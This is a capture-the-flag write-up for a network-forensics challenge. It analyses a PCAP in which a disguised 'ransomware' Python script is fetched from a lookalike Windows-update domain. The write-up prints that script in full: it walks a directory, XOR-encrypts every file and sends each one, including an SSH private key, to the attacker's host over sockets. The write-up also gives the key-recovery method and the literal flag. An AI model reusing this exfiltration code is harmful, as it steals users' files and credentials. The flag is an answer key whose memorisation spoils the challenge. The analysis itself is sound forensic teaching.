# Description
Author: @Jstith

We received a plea for help from a rather frustrated looking employee. He said he accidently ran malware on his computer, but when he tried to pay the "leet hacker" to get his files back they said the malware was "broken"... best IT could do was provide us a PCAP.

Download the file(s) below.

# Files
`1337-malware.pcapng`

# Malware
When openning the capture in Wireshark, on of the first packets is a GET request to `vvindowsupdate.com` for `/rans.py` and it is soon followed by the response, which has the code: 

```py
import socket
import base64
import os
from random import randbytes
from pwn import xor

# DON'T FORGET TO CHANGE THIS TO THE REAL KEY!!!!
key = randbytes(32)

def encrypt(filename):
    f = open(filename, 'rb')
    data = f.read()
    f.close()
   
    encrypted = xor(data, key)
    return encrypted

def send_encrypted(filename):
    print(f'sending {filename}')
    data = encrypt(filename)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('vvindowsupdate.com', 1337))
    s.sendall((f'Sending: {filename}').encode())
    s.close()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('vvindowsupdate.com', 1337))
    s.sendall(data)
    s.close()

def get_all_files():
    file_paths = []
    for root, dirs, files in os.walk(os.path.dirname(os.path.realpath(__file__))):
        for file in files:
            file_paths.append(os.path.join(root, file))
    file_paths.remove(__file__)      
    return file_paths

files = get_all_files()
for f in files:
    send_encrypted(f)
    #os.remove(f)
```

From this, we can see the "broken" part of the script is that the hacker doesn't know the key they used to xor the data with. 
We can also see from the code that each time the data is transmitted, it's precided by a packet giving the full path to the file. 

# Getting the key
Using wireshark, we can follow each of the TCP streams and export the data, and also know what each file was supposed to be. There were 5 in total:
```
/home/davey/Documents/resources.zip
/home/davey/Documents/ecorp.png
/home/davey/Documents/Welcome Aboard.pdf
/home/davey/Documents/.ssh/id_rsa
/home/davey/Documents/.ssh/id_rsa.pub
```

to get the key, xor the original data with the output data. 
We know that the key is 32 bytes long from the source code. 
Of the data files, the id_rsa file will have a header that's long enough.
then xor the encrypted data with the key to get the original files. 
Open the pdf to get the zip password
open the zip to get the flag `flag{c95c4ff18b0eb88123de779051a7a24f}`
